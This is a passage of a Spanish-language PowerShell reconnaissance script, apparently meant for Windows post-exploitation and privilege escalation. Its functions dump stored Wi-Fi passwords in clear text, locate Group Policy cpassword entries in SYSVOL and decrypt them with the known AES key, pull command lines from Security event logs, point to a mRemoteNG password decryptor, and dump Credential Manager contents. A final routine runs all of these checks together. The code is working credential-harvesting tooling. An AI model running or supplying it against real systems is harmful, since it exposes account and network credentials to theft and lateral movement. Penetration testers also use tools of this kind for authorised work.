Write-Host "`n[+] ================================== Encontrada configuracion de mRemoteNG  ==================================`n"
Write-Host "[+] $usuario\appdata\Roaming\mRemoteNG`n"
(ls $usuario\appdata\Roaming\mRemoteNG).FullName
Write-Host "`n[+] Herramienta para descifrar `nhttps://github.com/kmahyyg/mremoteng-decrypt"

} else {}

}
}
function Get-Software {
ls HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall | ForEach-Object -Process {$_.getvalue("DisplayName")}


}
function Find-EventCommand {param($string) if ($string -eq $null) {$comandos = (get-WinEvent -FilterHashtable @{LogName = 'Security'} | Select-Object @{name='NewProcessName';expression={ $_.Properties[5].Value }}, @{name='CommandLine';expression={ $_.Properties[8].Value }}).commandline ; $comandos | Out-File $env:temp"\salida.txt" ; $comandos = gc $env:temp"\salida.txt"; $comandos} else {$comandos = (get-WinEvent -FilterHashtable @{LogName = 'Security'} | Select-Object @{name='NewProcessName';expression={ $_.Properties[5].Value }}, @{name='CommandLine';expression={ $_.Properties[8].Value }}).commandline ; $comandos | Out-File $env:temp"\salida.txt" ; $comandos = gc $env:temp"\salida.txt"; $comandos | Select-String $string }}
function Wifi-Password {

if ((Get-WinUserLanguageList)[0].LanguageTag -eq "es-Es"){
Start-Job -ScriptBlock {(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Select-String "Contenido de la clave\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-File $env:temp\wifi.txt}  | Wait-Job | Receive-Job
}
else{
Start-Job -ScriptBlock {(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-File $env:temp\wifi.txt}  | Wait-Job | Receive-Job
}
if ((gc $env:temp\wifi.txt).count -ge 1) {
write-host "`n[+] ================================== Wifi Passwords  =================================="
gc $env:temp\wifi.txt
Remove-Item $env:temp\wifi.txt -ea SilentlyContinue


}}
function Espera-Proceso {param($proceso)
do {sleep -Seconds 2}
while ((get-process $proceso -ErrorAction SilentlyContinue).count -ge 1)

}
function Get-DecryptedCpassword {
    [CmdletBinding()]
    Param (
        [string] $Cpassword 
    )

    try {
          
        $Mod = ($Cpassword.length % 4)
          
        switch ($Mod) {
        '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
        '2' {$Cpassword += ('=' * (4 - $Mod))}
        '3' {$Cpassword += ('=' * (4 - $Mod))}
        }

        $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            
        
        try
        {
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider -ErrorAction Stop
        }
        catch
        {
            
            Write-Warning 'Unable to decrypt cPassword is .Net 3.5 installed?'
            return $Cpassword
        }
        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            
        
        $AesIV = New-Object Byte[]($AesObject.IV.Length) 
        $AesObject.IV = $AesIV
        $AesObject.Key = $AesKey
        $DecryptorObject = $AesObject.CreateDecryptor() 
        [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
        return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
    } 
        
    catch {Write-Error $Error[0]}
} 
function Search-cpassword {


$path_sysvol = "\\" + (get-info).dominio + "\sysvol\" + (get-info).dominio + "\" + "policies" + "\*.xml"
$cpassword = findstr /S /I cpassword $path_sysvol; if ($cpassword -ne $null) {$archivo = ($cpassword -split ":")[0];  $cuenta = $cpassword.Length ; $cpassword = $cpassword.Split(" ")
if ($cuenta -ge 20) {
$username_cpassword = (($cpassword | Select-String "userName") -replace 'userName="','' -split '"')[0]
$pass_cpassword = ($cpassword | Select-String "cpassword") -replace 'cpassword="','' -replace '"',""
$password_texto_plano = Get-DecryptedCpassword -Cpassword $pass_cpassword
Write-Host "`n[+] ============================ Encontradas Credenciales Cpass ==================================`n"
Write-Host "[+] File = $archivo"
Write-Host "[+] Username = $username_cpassword"
Write-Host "[+] Password = $password_texto_plano"
} else {}
}
} 
function Comprueba-Todo {
Write-Host $banner
Write-Host "`n[+] ================================== Informacion General del Sistema  ==================================`n"
get-info
Write-Host "`n[+] ================================== Unidades del Sistema  ==================================`n"
get-discosduros 
Write-Host "`n[+] ================================== Privilegios del CurrentUser  ==================================`n"
whoami /priv
Write-Host "`n[+] ================================== Usuarios Locales  ==================================`n"
net user ; Espera-Proceso "net" ; sleep -Seconds 2
Write-Host "`n[+] ================================== Grupos Locales  ==================================`n"
net localgroup | Select-String "\*" ; Espera-Proceso "net"
get-configRED 
get-webconfig
Write-Host "`n[+] ================================== Software Instalado  ==================================`n"
get-software
Write-Host "`n[+] ================================== Drivers de terceros  ==================================`n"
get-driversinstalados
Write-Host "`n[+] ================================== Servicios sin Comillas  =================================="
Obtenemos-Servicios
Wifi-Password
Search-cpassword
get-autologon ; sleep -Seconds 4
get-mremote
Write-Host "`n[+] ================================== Credenciales del sistema  =================================="
credman -ShoCred | fl
get-config-firewall
}
